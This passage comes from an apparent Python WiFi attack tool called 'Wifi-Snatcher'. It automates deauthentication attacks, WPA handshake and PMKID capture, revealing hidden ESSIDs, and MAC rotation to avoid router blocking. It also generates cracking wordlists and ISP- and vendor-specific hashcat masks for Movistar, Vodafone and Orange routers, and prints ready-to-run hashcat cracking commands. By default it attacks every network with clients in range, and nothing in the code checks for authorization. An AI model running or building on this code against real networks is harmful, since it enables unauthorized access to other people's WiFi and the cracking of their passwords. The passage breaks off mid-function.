    "MOVISTAR_OLD_HEX8": [{"mask": "?h" * 8, "priority": 1}],
    "MOVISTAR_OLD_HEX20": [{"mask": "?h" * 20, "priority": 3}],
    "VODAFONE_NUM8": [{"mask": "?d" * 8, "priority": 1}],
    "ORANGE_ALNUM10": [{"mask": "?a" * 10, "priority": 2}],
    "GENERIC_NUM9": [{"mask": "?d" * 9, "priority": 1}],
    "GENERIC_ALNUM8": [{"mask": "?a" * 8, "priority": 1}],
}

# OUI (first 3 bytes of BSSID) to ISP for contextual detection
_OUI_TO_ISP: dict[str, str] = {
    "00:19:C6": "MOVISTAR",
    "00:1E:75": "MOVISTAR",
    "00:25:68": "MOVISTAR",
    "F4:F5:D8": "MOVISTAR",
    "E4:50:EB": "VODAFONE",
    "00:1E:7A": "VODAFONE",
    "00:23:CD": "ORANGE",
    "00:26:4A": "ORANGE",
}

# OUI to router vendor for historical pattern selection (model-specific masks)
_OUI_TO_VENDOR: dict[str, str] = {
    "00:19:C6": "ZTE",
    "00:1E:75": "ZTE",
    "00:25:68": "Huawei",
    "F4:F5:D8": "MitraStar",
    "E4:50:EB": "Huawei",
    "00:1E:7A": "ZTE",
    "00:23:CD": "Huawei",
    "00:26:4A": "Sagemcom",
}

# Per-ISP per-vendor mask sets (historical patterns). "default" when vendor unknown.
# Many current routers are not purely hex; include hybrid-style patterns.
_ISP_MASKS_BY_VENDOR: dict[str, dict[str, list[dict]]] = {
    "MOVISTAR": {
        "default": [
            {"mask": "?h" * 8, "priority": 1},
            {"mask": "?h" * 4 + "?d" * 4, "priority": 1},
            {"mask": "?d" * 8, "priority": 2},
        ],
        "ZTE": [
            {"mask": "?h" * 8, "priority": 1},
            {"mask": "?h" * 6 + "?d" * 2, "priority": 1},
            {"mask": "?d" * 8, "priority": 2},
        ],
        "Huawei": [
            {"mask": "?h" * 8, "priority": 1},
            {"mask": "?h" * 4 + "?d" * 4, "priority": 1},
        ],
        "MitraStar": [
            {"mask": "?h" * 8, "priority": 1},
            {"mask": "?d" * 8, "priority": 1},
        ],
        "Sagemcom": [
            {"mask": "?h" * 8, "priority": 1},
            {"mask": "?d" * 8, "priority": 1},
        ],
    },
    "VODAFONE": {
        "default": [
            {"mask": "?d" * 8, "priority": 1},
            {"mask": "?d" * 6, "priority": 1},
        ],
        "ZTE": [{"mask": "?d" * 8, "priority": 1}, {"mask": "?h" * 4 + "?d" * 4, "priority": 2}],
        "Huawei": [{"mask": "?d" * 8, "priority": 1}],
    },
    "ORANGE": {
        "default": [
            {"mask": "?d" * 8, "priority": 1},
            {"mask": "?a" * 8, "priority": 2},
        ],
        "Huawei": [{"mask": "?d" * 8, "priority": 1}, {"mask": "?a" * 8, "priority": 2}],
        "Sagemcom": [{"mask": "?d" * 8, "priority": 1}],
    },
}


def _bssid_to_oui(bssid: str) -> str:
    """Normalize BSSID to OUI string XX:XX:XX (first 3 bytes)."""
    if not bssid:
        return ""
    parts = bssid.replace("-", ":").strip().split(":")[:3]
    return ":".join(p.upper().zfill(2) for p in parts if len(p) <= 2)[:8]


def _get_isp_hybrid_bases(essid: str, profile: str) -> list[str]:
    """Base words for hashcat hybrid -a 6 (wordlist + mask). One word per line."""
    essid_s = (essid or "").strip()
    bases: list[str] = []
    if essid_s:
        bases.extend([essid_s, essid_s.lower(), essid_s.upper(), essid_s.title()])
    if profile == "MOVISTAR":
        bases.extend(["Movistar", "movistar", "MOVISTAR", "Movistar_"])
    elif profile == "VODAFONE":
        bases.extend(["Vodafone", "vodafone", "VODAFONE"])
    elif profile == "ORANGE":
        bases.extend(["Orange", "orange", "ORANGE"])
    return list(dict.fromkeys(bases))


def generate_isp_masks(
    essid: str,
    aggressive: bool = False,
    bssid: Optional[str] = None,
) -> tuple[Optional[str], list[dict], list[str]]:
    """
    Returns (ISP_profile, list of {mask, priority}, hybrid_base_words) from ESSID and/or BSSID OUI.
    Uses vendor from OUI for model-specific historical patterns. hybrid_base_words for -a 6.
    """
    essid_upper = (essid or "").upper().strip()
    oui = _bssid_to_oui(bssid or "")
    profile_from_essid: Optional[str] = None
    if essid_upper.startswith("MOVISTAR"):
        profile_from_essid = "MOVISTAR"
    elif essid_upper.startswith("VODAFONE"):
        profile_from_essid = "VODAFONE"
    elif essid_upper.startswith("ORANGE"):
        profile_from_essid = "ORANGE"
    profile_from_oui = _OUI_TO_ISP.get(oui) if oui else None
    profile = profile_from_essid or profile_from_oui
    if not profile:
        return None, [], []

    vendor = _OUI_TO_VENDOR.get(oui, "default") if oui else "default"
    by_vendor = _ISP_MASKS_BY_VENDOR.get(profile, {})
    out: list[dict] = list(by_vendor.get(vendor) or by_vendor.get("default") or [])

    # ESSID-derived masks (e.g. MOVISTAR_1A2B -> 1A2B?h?h?h?h)
    if profile == "MOVISTAR":
        m = re.search(r"_([0-9A-F]{4})$", essid_upper)
        if m:
            suffix = m.group(1)
            out.append({"mask": suffix + "?h" * 4, "priority": 1})
            out.append({"mask": "?h" * 4 + suffix, "priority": 1})
        if aggressive:
            out.append({"mask": "?h" * 20, "priority": 3})

    if profile == "ORANGE" and aggressive:
        out.append({"mask": "?a" * 10, "priority": 3})

    hybrid_bases = _get_isp_hybrid_bases(essid or "", profile)
    return profile, out, hybrid_bases


def _mask_keyspace(mask: str) -> int:
    """Search space size for a hashcat mask (?h=16, ?d=10, ?a=95)."""
    n_h, n_d, n_a = mask.count("?h"), mask.count("?d"), mask.count("?a")
    return (16 ** n_h) * (10 ** n_d) * (95 ** n_a)


def _estimate_mask_time_hours(keyspace: int, speed_hps: float = 300_000.0) -> float:
    """Estimate hours to exhaust keyspace at speed_hps (WPA2 ~250-350 kH/s typical)."""
    if keyspace <= 0 or speed_hps <= 0:
        return 0.0
    return keyspace / speed_hps / 3600.0


def get_hashcat_speed_22000() -> Optional[float]:
    """
    Run hashcat -b -m 22000 and parse reported speed. Returns H/s or None if unavailable.
    Used to adjust mask time estimates and filtering dynamically.
    """
    if shutil.which("hashcat") is None:
        return None
    code, out, err = run_cmd(["hashcat", "-b", "-m", "22000"], timeout=120)
    combined = (out or "") + "\n" + (err or "")
    # Speed.#1.........: 250.0 kH/s or 1.5 MH/s
    m = re.search(r"Speed\.#\d+[.\s]+:\s*([\d.]+)\s*([kMG])?H/s", combined, re.IGNORECASE)
    if not m:
        return None
    try:
        val = float(m.group(1))
        unit = (m.group(2) or " ").upper()
        mult = {" ": 1, "K": 1e3, "M": 1e6, "G": 1e9}
        return val * mult.get(unit, 1)
    except (ValueError, IndexError):
        return None


def write_hcmask(
    filename: str,
    masks: list[dict],
    max_hours: float = 48.0,
    speed_hps: float = 300_000.0,
) -> tuple[int, int]:
    """
    Write .hcmask for hashcat -a 3. Skips masks with estimated time > max_hours.
    Returns (written_count, skipped_count).
    """
    Path(filename).parent.mkdir(parents=True, exist_ok=True)
    sorted_masks = sorted(masks, key=lambda x: x["priority"])
    written: list[dict] = []
    skipped = 0
    for entry in sorted_masks:
        mask = entry["mask"]
        hours = _estimate_mask_time_hours(_mask_keyspace(mask), speed_hps)
        if hours > max_hours:
            logging.debug("Skip mask (est. %.1f h > %.0f h): %s", hours, max_hours, mask)
            skipped += 1
            continue
        written.append(entry)
    with open(filename, "w", encoding="utf-8") as f:
        for entry in written:
            f.write(entry["mask"] + "\n")
    if skipped:
        logging.info("Skipped %d mask(s) with estimated time > %.0f h", skipped, max_hours)
    return len(written), skipped


def _all_case_permutations(word: str) -> set[str]:
    """Only lower, Capitalized, UPPER (no full 2^n to reduce noise and improve effectiveness)."""
    low = word.lower()
    return {low, low.upper(), low.title() if low else low}


def _all_leet_variants(word: str) -> set[str]:
    """Limited leet: only common variants a→4, e→3, o→0 (one substitution type per variant). No deep cross."""
    low = word.lower()
    if len(low) > _MAX_LEET_LEN:
        return {word}
    out: set[str] = {word}
    for char, sub in _LEET_LIMITED.items():
        if char in low:
            out.add("".join(sub if c == char else c for c in low))
    return out


def _case_then_leet_bases(word: str) -> set[str]:
    """Case variants (lower/upper/title) then limited leet variants."""
    case_set = _all_case_permutations(word)
    bases: set[str] = set()
    for c in case_set:
        bases |= _all_leet_variants(c)
    return bases


def _wordlist_score(word: str, current_year: int) -> int:
    """
    Heuristic score for wordlist ordering (lower = higher priority).
    Prefer: recent years (2023 > 2019), 2-digit year over 4-digit, typical capitalization.
    """
    score = 0
    # Historical frequency: more recent year = lower score (2024=0, 2023=1, 2019=5)
    year_penalty = 10
    for y in range(current_year + 1, 1999, -1):
        if str(y) in word or (y >= 2000 and str(y)[2:] in word):
            year_penalty = max(0, current_year - y)
            break
    score += year_penalty
    # Prefer 2-digit year over full 4-digit when same year
    s = str(current_year)
    s2 = s[2:]
    if s2 in word and s in word:
        pass
    elif s2 in word:
        pass
    elif s in word:
        score += 1
    if word.islower() or word.isupper() or (len(word) > 0 and word[0].isupper() and word[1:].islower()):
        pass
    else:
        score += 1
    return score


def generate_wordlist_for_essid(essid: str, output_path: Path, max_words: Optional[int] = None) -> int:
    """
    Generate a wordlist for the given ESSID: case/leet permutations + prefixes/suffixes (years, months, etc.).
    Incremental generation: if max_words is set, stop adding once that limit is reached (less RAM and time).
    """
    if not essid or not essid.strip():
        return 0
    base = essid.strip()
    bases = _case_then_leet_bases(base)
    words: set[str] = set()
    # Only WPA2-valid candidates (8-63 chars)
    for w in bases:
        if 8 <= len(w) <= 63:
            words.add(w)
    current_year = time.localtime().tm_year
    year_suffixes = []
    for i in range(6):
        y = current_year - i
        year_suffixes.append(str(y))
        year_suffixes.append(str(y)[2:])
    # Limit years to avoid explosion: 2000–current for full, last 15 years for short
    years_full = [str(y) for y in range(current_year - 10, current_year + 1)]
    years_short = [str(y)[2:] for y in range(max(2000, current_year - 14), current_year + 1)]
    months = [f"{m:02d}" for m in range(1, 13)]
    suffixes = ["!", "!!", "@", "#", "123", "1234", "*", "?"]
    separators = [".", "-", "_", "*"]

    def capped() -> bool:
        return max_words is not None and len(words) >= max_words

    def add(s: str) -> None:
        if 8 <= len(s) <= 63:
            words.add(s)

    # Incremental generation: stop as soon as we reach max_words
    if not capped():
        for w in bases:
            if capped():
                break
            for suf in suffixes:
                add(w + suf)
                add(suf + w)
                for sep in separators:
                    add(w + sep + suf)
                    add(suf + sep + w)
            if capped():
                break
            for y in year_suffixes:
                add(w + y)
                add(y + w)
                for sep in separators:
                    add(w + sep + y)
                    add(y + sep + w)
            if capped():
                break
            for y in years_full:
                add(w + y)
                add(y + w)
            for y in years_short:
                add(w + y)
                add(y + w)
            if capped():
                break
            for m in months:
                add(m + w)
                add(w + m)
                for sep in separators:
                    add(w + sep + m)
                    add(m + sep + w)
            add(w + "!")
            add(w + "123")
            add(w + "@")
            for sep in separators:
                add(w + sep + "123")
                add(w + sep + "!")

    # Sort by probability heuristics (current year first, typical cap, etc.) then alphabetically
    lines = sorted(words, key=lambda w: (_wordlist_score(w, current_year), w))
    if max_words is not None and len(lines) > max_words:
        lines = lines[:max_words]
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8", errors="replace") as f:
        for line in lines:
            f.write(line + "\n")
    return len(lines)


def init_db(db_path: Path) -> sqlite3.Connection:
    """Create or open SQLite DB and ensure table exists."""
    db_path.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(db_path))
    conn.execute("""
        CREATE TABLE IF NOT EXISTS captured (
            bssid TEXT PRIMARY KEY,
            essid TEXT,
            handshake_path TEXT,
            created_at TEXT
        )
    """)
    conn.execute(
        "CREATE INDEX IF NOT EXISTS idx_captured_essid ON captured(essid)"
    )
    conn.execute("""
        CREATE TABLE IF NOT EXISTS discovered_essids (
            bssid TEXT PRIMARY KEY,
            essid TEXT NOT NULL,
            discovered_at TEXT
        )
    """)
    conn.commit()
    return conn


def check_dependencies() -> bool:
    """
    Validate required and optional external tools at startup.
    Required: aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng), iw.
    Optional: hcxtools (hcxpcapngtool, hcxdumptool for PMKID), hashcat, iwconfig (fallback for iw).
    """
    required = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "iw"]
    optional = ["hcxpcapngtool", "hcxdumptool", "hashcat", "iwconfig"]

    missing_required = [c for c in required if shutil.which(c) is None]
    missing_optional = [c for c in optional if shutil.which(c) is None]

    if missing_required:
        logging.error("Missing required tools: %s", ", ".join(missing_required))
        logging.error(
            "Install before continuing. Example: sudo apt update && sudo apt install aircrack-ng iw"
        )
        return False

    if missing_optional:
        logging.warning(
            "Optional tools not found: %s (some features may be limited)",
            ", ".join(missing_optional),
        )
        if "hcxpcapngtool" in missing_optional or "hcxdumptool" in missing_optional:
            logging.warning("Install hcxtools for .22000 and PMKID: sudo apt install hcxtools")

    logging.debug("Required dependencies OK.")
    return True


def cleanup_handshakes_dir_leftovers(handshakes_dir: Path) -> None:
    """
    Remove junk files from previous runs (interrupted captures, PMKID temp files).
    Same kind of cleanup as on exit; call at startup so we start with a clean handshakes dir.
    """
    if not handshakes_dir.exists():
        return
    removed = 0
    for pattern in ("pmkid_filter_*.txt", "pmkid_*.pcapng", "hs_*"):
        for p in handshakes_dir.glob(pattern):
            try:
                if p.is_file():
                    p.unlink()
                    removed += 1
            except OSError:
                pass
    if removed:
        logging.info("Cleaned %d leftover file(s) from previous run in %s", removed, handshakes_dir)


def verify_stored_handshakes(conn: sqlite3.Connection, handshakes_dir: Path) -> None:
    """
    Re-verify all stored handshakes with hcxpcapngtool; remove from DB and disk if invalid.
    Call this on script exit to drop false positives.
    """
    to_remove: list[tuple[str, str]] = []
    for row in conn.execute("SELECT bssid, essid, handshake_path FROM captured"):
        bssid, essid, handshake_path = (row[0] or "").strip(), (row[1] or "").strip(), (row[2] or "").strip()
        if not handshake_path:
            to_remove.append((bssid, essid))
            continue
        cap_path = Path(handshake_path)
        if not cap_path.is_absolute():
            cap_path = handshakes_dir / cap_path.name
        if not cap_path.exists():
            logging.warning("Stored handshake file missing, removing from DB: %s", cap_path)
            to_remove.append((bssid, essid))
            continue
        hc_path = convert_cap_to_hashcat(cap_path)
        if hc_path is None or not hc_path.exists() or hc_path.stat().st_size == 0:
            logging.info("Removing invalid handshake (failed re-check): %s (%s)", bssid, essid or "?")
            to_remove.append((bssid, essid))
            try:
                cap_path.unlink()
            except OSError:
                pass
            hc_file = cap_path.with_suffix(cap_path.suffix + ".22000")
            if hc_file.exists():
                try:
                    hc_file.unlink()
                except OSError:
                    pass
            continue
        # Ensure .22000 is next to .cap with expected name (already done at store time; no-op usually)
        expected_22000 = cap_path.with_suffix(cap_path.suffix + ".22000")
        if hc_path != expected_22000 and expected_22000.exists():
            try:
                hc_path.unlink()
            except OSError:
                pass
    for bssid, essid in to_remove:
        conn.execute("DELETE FROM captured WHERE bssid = ?", (bssid,))
    if to_remove:
        conn.commit()
        logging.info("Final check: removed %d invalid handshake(s) from DB and disk.", len(to_remove))


class _HelpFormatter(argparse.ArgumentDefaultsHelpFormatter):
    def _get_help_string(self, action: argparse.Action) -> str:
        help_str = super()._get_help_string(action)
        if action.default is None and "%(default)" not in (action.help or ""):
            if action.dest == "path":
                return (action.help or "") + " (default: Actual path)"
            if action.dest == "log":
                return (action.help or "") + " (default: disabled)"
        return help_str


def _print_banner() -> None:
    """Print ASCII banner to stdout (with color if available)."""
    try:
        if HAS_COLORAMA:
            print(f"{Fore.CYAN}{Style.BRIGHT}{BANNER}{R}")
        else:
            print(BANNER)
    except Exception:
        print(BANNER)


def main() -> int:
    _print_banner()
    parser = argparse.ArgumentParser(
        description="Wifi-Snatcher - WiFi handshake capture & wordlist generator.",
        formatter_class=_HelpFormatter,
    )
    parser.add_argument("-d", "--device", default=None, help="Wireless interface (e.g. wlan0); not required with -w")
    parser.add_argument("-t", "--time", "--scan-time", type=int, default=60, metavar="SECONDS",
                        help="Scan duration in seconds per round (default: 60)")
    parser.add_argument("-l", "--log", default=None, help="Path to log file")
    parser.add_argument("-p", "--path", default=None, help="Directory for scan files, handshakes and DB")
    parser.add_argument("-se", "--skip-essid", action="append", default=[], dest="skip_essids", metavar="ESSID",
                        help="ESSID to exclude from attacks (repeatable)")
    parser.add_argument("-sb", "--skip-bssid", action="append", default=[], dest="skip_bssids_arg", metavar="BSSID",
                        help="BSSID (MAC) to exclude from attacks (repeatable)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show verbose messages (e.g. why a handshake was not marked as captured)")
    parser.add_argument("-w", "--wordlist", nargs="?", const="", default=None, metavar="DIR",
                        help="Generate wordlists for captured ESSIDs only (no attacks); DIR = output dir (default: <path>/wordlists)")
    parser.add_argument("--max-words", type=int, default=None, metavar="N",
                        help="Cap wordlist at N entries per ESSID (e.g. 500000).")
    parser.add_argument("--aggressive-masks", action="store_true",
                        help="Include heavy masks (?h20, ?a10) in ISP .hcmask (infeasible in normal audits).")
    parser.add_argument("-b", "--bssid", action="append", default=[], dest="target_bssids", metavar="BSSID",
                        help="Single target mode by BSSID (repeatable). If used, only these BSSIDs will be attacked.")
    parser.add_argument("-e", "--essid", action="append", default=[], dest="target_essids", metavar="ESSID",
                        help="Single target mode by ESSID (repeatable). If used, all APs with that name will be attacked.")
    parser.add_argument("-c", "--channel", type=int, default=None,
                        help="Fixed channel for scanning and capture (optional).")
    parser.add_argument("--stats", nargs="?", const=30, type=int, metavar="SECONDS",
                        help="Show periodic statistics: default every 30s, or every SECONDS if provided.")
    parser.add_argument("--ap-timeout", type=int, default=None, metavar="SECONDS",
                        help="Maximum capture time per AP (including deauth rounds).")
    parser.add_argument("--ap-delay", type=int, default=2, metavar="SECONDS",
                        help="Delay between APs to avoid driver issues.")
    parser.add_argument("--hidden-wait", type=int, default=25, metavar="SECONDS",
                        help="Max time (seconds) to spend trying to reveal a hidden ESSID before capture.")
    parser.add_argument("--hidden-passive", type=int, default=10, metavar="SECONDS",
                        help="Passive sniff time (no deauth) before attempting deauth for hidden ESSID.")
    parser.add_argument("--pmkid-timeout", type=int, default=15, metavar="SECONDS",
                        help="Time per channel for PMKID capture (hidden, no client). Multiple BSSIDs on same channel are captured together (default: 15).")
    parser.add_argument("--mac-rotate", type=int, default=0, metavar="N",
                        help="Rotate interface MAC every N cycles (0=disabled). Reduces router blocking.")
    args = parser.parse_args()

    base_path = (Path(args.path) if args.path else Path.cwd()).resolve()
    base_path.mkdir(parents=True, exist_ok=True)
    db_path = base_path / "captured.db"
    handshakes_dir = base_path / "handshakes"
    scan_temp_dir: Optional[Path] = None

    setup_logging(args.log)

    # Wordlist-only mode: no device, no attacks; generate one wordlist per captured ESSID
    if args.wordlist is not None:
        out_dir = (base_path / "wordlists").resolve() if args.wordlist == "" else Path(args.wordlist).resolve()
        out_dir.mkdir(parents=True, exist_ok=True)
        speed_hps = get_hashcat_speed_22000()
        if speed_hps is None:
            speed_hps = 300_000.0
            logging.debug("Using default 300 kH/s for mask estimates (hashcat benchmark not available)")
        else:
            logging.info("Hashcat WPA2 benchmark: %.1f kH/s (used for mask time estimates)", speed_hps / 1000.0)
        conn = init_db(db_path)
        seen: set[str] = set()
        total_words = 0
        for row in conn.execute("SELECT essid, bssid FROM captured"):
            essid = (row[0] or "").strip()
            bssid = (row[1] or "").strip() if len(row) > 1 else ""
            if not essid or essid in seen:
                continue
            seen.add(essid)
            safe_name = re.sub(r"[^\w\-.]", "_", essid)[:50]
            out_file = out_dir / f"{safe_name}.txt"
            n = generate_wordlist_for_essid(essid, out_file, max_words=args.max_words)
            total_words += n
            logging.info("Generated wordlist for %s: %s (%d words)", essid, out_file, n)
            # Recommended hashcat command: wordlist attack (-a 0); use .22000 file for hashcat
            def _rel(base: Path, p: Path) -> str:
                try:
                    return str(Path(p).resolve().relative_to(base.resolve()))
                except ValueError:
                    return str(Path(p).resolve())
            handshake_placeholder = "HANDSHAKE.22000"
            try:
                row_h = conn.execute("SELECT handshake_path FROM captured WHERE essid = ? LIMIT 1", (essid,)).fetchone()
                if row_h and row_h[0]:
                    p = Path(row_h[0]).resolve()
                    hc_path = p.with_suffix(p.suffix + ".22000")
                    handshake_placeholder = _rel(base_path, hc_path) if hc_path.exists() else _rel(base_path, p)
            except Exception:
                pass
            logging.info(
                "  Hashcat (wordlist): hashcat -a 0 -m 22000 %s %s -O -w 4 --status --force",
                handshake_placeholder, _rel(base_path, out_file),
            )
            isp, masks, hybrid_bases = generate_isp_masks(essid, aggressive=args.aggressive_masks, bssid=bssid)
            if masks:
                hcmask_path = out_dir / f"{safe_name}_isp.hcmask"
                written, skipped = write_hcmask(str(hcmask_path), masks, max_hours=48.0, speed_hps=speed_hps)
                logging.info(
                    "Generated ISP masks for %s: %s (%s, %d written%s)",
                    essid, hcmask_path, isp or "", written,
                    f", {skipped} skipped (>48h)" if skipped else "",
                )
                logging.info(
                    "  Hashcat (mask -a 3): hashcat -a 3 -m 22000 %s %s -O -w 4 --status --force",
                    handshake_placeholder, _rel(base_path, hcmask_path),
                )
                if hybrid_bases:
                    bases_path = out_dir / f"{safe_name}_isp_bases.txt"
                    bases_path.write_text("\n".join(hybrid_bases) + "\n", encoding="utf-8")
                    logging.info("  Hybrid bases for -a 6: %s (%d words)", _rel(base_path, bases_path), len(hybrid_bases))
                    example_mask = next((m["mask"] for m in sorted(masks, key=lambda x: x["priority"]) if _estimate_mask_time_hours(_mask_keyspace(m["mask"]), speed_hps) <= 48), None)
                    if example_mask:
                        logging.info(
                            '  Hashcat (hybrid -a 6): hashcat -a 6 -m 22000 %s %s "%s" -O -w 4 --status --force',
                            handshake_placeholder, _rel(base_path, bases_path), example_mask,
                        )
                logging.info("  For long runs: add --runtime=1800 to avoid running indefinitely.")
        conn.close()
        if not seen:
            logging.warning("No captured ESSIDs in DB; no wordlists generated.")
        else:
            logging.info("Wordlist mode done: %d ESSID(s), %d total words in %s", len(seen), total_words, out_dir)
        return 0

    # From here on, we are in online capture mode and must be root with dependencies available.
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        logging.error("This script must be run as root. Use sudo or run it as the root user.")
        return 1

    if not check_dependencies():
        return 1

    if not args.device:
        logging.error("Device (-d) is required when not using -w/--wordlist.")
        return 1

    scan_temp_dir = Path(tempfile.mkdtemp(prefix="wifi_handshake_scan_"))

    cleanup_handshakes_dir_leftovers(handshakes_dir)

    # Save NetworkManager state so we can restore only if it was active
    nm_was_active = False
    try:
        code, out, _ = run_cmd(["systemctl", "is-active", "NetworkManager"], timeout=5)
        nm_was_active = code == 0 and (out or "").strip().lower() == "active"
    except Exception:
        pass

    logging.info("Data path: %s | Handshakes: %s | DB: %s", base_path, handshakes_dir, db_path)

    mon_iface = ensure_monitor_mode(args.device)
    if not mon_iface:
        logging.error("Could not set monitor mode. Run as root and pass a valid interface.")
        if scan_temp_dir is not None:
            shutil.rmtree(scan_temp_dir, ignore_errors=True)
        return 1

    conn = init_db(db_path)
    skip_bssids: set[str] = set()
    try:
        for row in conn.execute("SELECT bssid FROM captured"):
            skip_bssids.add((row[0] or "").strip().lower())
    except Exception:
        pass
    for b in args.skip_bssids_arg or []:
        skip_bssids.add(b.strip().lower())
    skip_essids: set[str] = set((e.strip() for e in (args.skip_essids or [])))
    if skip_essids:
        logging.info("Skipping ESSIDs: %s", ", ".join(skip_essids))
    if args.skip_bssids_arg:
        logging.info("Skipping %d user BSSIDs", len(args.skip_bssids_arg))
    logging.info("Already captured %d networks (will skip)", len(skip_bssids))

    target_bssids = set((b.strip().lower() for b in (args.target_bssids or [])))
    target_essids = set((e.strip() for e in (args.target_essids or [])))
    if target_bssids:
        logging.info("Single target mode by BSSID: %s", ", ".join(sorted(target_bssids)))
    if target_essids:
        logging.info("Single target mode by ESSID: %s", ", ".join(sorted(target_essids)))
    if args.channel is not None:
        logging.info("Using fixed channel: %s", args.channel)

    discovered_essids: dict[str, str] = {}
    try:
        for row in conn.execute("SELECT bssid, essid FROM discovered_essids"):
            b = (row[0] or "").strip().lower()
            e = (row[1] or "").strip()
            if b and e:
                discovered_essids[b] = e
    except Exception:
        pass
    if discovered_essids:
        logging.info("Loaded %d cached revealed ESSID(s) for hidden networks", len(discovered_essids))

    # Per-run failure count; skip network for rest of run after 4 failures
    fail_count: dict[str, int] = {}
    MAX_FAILURES_BEFORE_SKIP = 4

    def reload_skip_list() -> None:
        nonlocal skip_bssids
        skip_bssids = set((b.strip().lower() for b in (args.skip_bssids_arg or [])))
        for row in conn.execute("SELECT bssid FROM captured"):
            skip_bssids.add((row[0] or "").strip().lower())

    # Holder for current airodump (or other) subprocess; signal handler kills it and exits
    current_proc_holder: list = [None]

    def sig_handler(_sig: int, _frame: object) -> None:
        logging.info("Interrupt received; stopping all...")
        proc = current_proc_holder[0]
        if proc is not None:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=1)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
            current_proc_holder[0] = None
        # Do not set_managed_mode nor close conn here; finally block will run and do both once
        sys.exit(0)

    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)

    cycle = 0
    start_time = time.time()
    stats = {
        "cycles": 0,
        "attempted": 0,
        "success": 0,
        "failed": 0,
        "skipped": 0,
        "hidden_resolved": 0,
    }
    seen_bssids: set[str] = set()
    seen_hidden_bssids: set[str] = set()

    def format_stats() -> str:
        elapsed = int(time.time() - start_time)
        return (
            f"Cycles: {stats['cycles']} | Networks: {len(seen_bssids)} | "
            f"Attempts: {stats['attempted']} | Success: {stats['success']} | Failed: {stats['failed']} | "
            f"Skipped: {stats['skipped']} | Hidden: {len(seen_hidden_bssids)}, Resolved: {stats['hidden_resolved']} | "
            f"Total time: {elapsed}s"
        )

    stats_thread: Optional[threading.Thread] = None
    stats_stop = threading.Event()

    if args.stats is not None and args.stats > 0:
        interval = max(5, args.stats)

        def _stats_worker() -> None:
            while not stats_stop.wait(interval):
                logging.info("[Stats] %s", format_stats())

        stats_thread = threading.Thread(target=_stats_worker, name="stats-reporter", daemon=True)
        stats_thread.start()
    try:
        while True:
            cycle += 1
            stats["cycles"] = cycle
            if getattr(args, "mac_rotate", 0) and args.mac_rotate > 0 and (cycle % args.mac_rotate == 0):
                rotate_mac(mon_iface)
            logging.info("=== Cycle %d ===", cycle)
            networks = get_networks_with_clients(
                mon_iface, args.time, scan_temp_dir, skip_bssids, skip_essids, current_proc_holder, args.channel
            )
            for net in networks:
                seen_bssids.add(net["bssid"].lower())
            if not networks:
                logging.info("No new networks with clients; rescanning in 60s")
                time.sleep(60)
                continue

            # Handshake capture (with deauth) for networks with clients; hidden+no-clients skipped here, done at end
            for net in networks:
                bssid = net["bssid"]
                channel = net["channel"]
                essid = net["essid"]
                clients = net["clients"]
                if not channel:
                    logging.warning("Skipping %s (no channel)", bssid)
                    stats["skipped"] += 1
                    continue
                if bssid.lower() in skip_bssids:
                    stats["skipped"] += 1
                    continue
                if fail_count.get(bssid.lower(), 0) >= MAX_FAILURES_BEFORE_SKIP:
                    logging.debug("Skipping %s (%s): failed %d times this run", bssid, essid or "?", fail_count[bssid.lower()])
                    stats["skipped"] += 1
                    continue

                if target_bssids and bssid.lower() not in target_bssids:
                    stats["skipped"] += 1
                    continue
                if target_essids and essid not in target_essids:
                    stats["skipped"] += 1
                    continue

                if essid == "hidden_network":
                    seen_hidden_bssids.add(bssid.lower())
                    if not clients:
                        # Already handled in phase 1 (PMKID at start of cycle); skip here
                        continue
                    logging.info("Hidden network detected: BSSID %s. Attempting ESSID recovery...", bssid)
                    cached = discovered_essids.get(bssid.lower())
                    if cached:
                        essid = cached
                        net["essid"] = cached
                        logging.info("Using cached ESSID for hidden BSSID %s: %s", bssid, cached)
                    else:
                        revealed = reveal_hidden_essid(
                            mon_iface, bssid, channel, clients,
                            scan_temp_dir, current_proc_holder,
                            timeout_sec=args.hidden_wait,
                            passive_secs=args.hidden_passive,
                        )
                        if revealed:
                            essid = revealed
                            net["essid"] = revealed
                            discovered_essids[bssid.lower()] = revealed
                            conn.execute(
                                "INSERT OR REPLACE INTO discovered_essids (bssid, essid, discovered_at) VALUES (?,?,?)",
                                (bssid, revealed, time.strftime("%Y-%m-%d %H:%M:%S")),
                            )
                            conn.commit()
                            stats["hidden_resolved"] += 1
                            logging.info("ESSID revealed: %s", revealed)
                        else:
                            logging.info("Could not reveal ESSID for %s; continuing with hidden_network", bssid)

                safe_essid = re.sub(r'[^\w\-.]', "_", essid or "unknown")[:32]
                short_hash = hashlib.sha1(bssid.encode()).hexdigest()[:8]
                cap_name = f"hs_{bssid.replace(':', '')}_{safe_essid}"
                cap_path = handshakes_dir / cap_name

                success = capture_handshake(
                    mon_iface, bssid, channel, clients, cap_path, max_deauth=5,
                    current_proc_holder=current_proc_holder,
                    essid=essid,
                    ap_timeout=args.ap_timeout,
                )
                stats["attempted"] += 1
                if success:
                    stats["success"] += 1
                    final_cap = Path(str(cap_path) + "-01.cap")
                    if not final_cap.exists():
                        for p in handshakes_dir.glob(cap_name + "*"):
                            if p.suffix == ".cap":
                                final_cap = p
                                break
                    if final_cap.exists():
                        # Convert with hcxpcapngtool first; only consider crackable if it produces valid .22000
                        # (aircrack-ng can give false positives; hcxpcapngtool is the authority for crackability)
                        final_name = handshakes_dir / f"{safe_essid}_{short_hash}_{bssid.replace(':', '')}.cap"
                        hc_path = convert_cap_to_hashcat(final_cap)
                        if hc_path is None:
                            # Not crackable per hcxpcapngtool (false positive or tool missing); keep attacking
                            fail_count[bssid.lower()] = fail_count.get(bssid.lower(), 0) + 1
                            for leftover in handshakes_dir.glob(cap_name + "*"):
                                try:
                                    leftover.unlink()
                                except OSError:
                                    pass
                                if args.verbose:
                                    logging.warning(
                                        "Not marking %s (%s) as captured: hcxpcapngtool did not produce valid .22000 (will retry)",
                                        bssid, essid or "?",
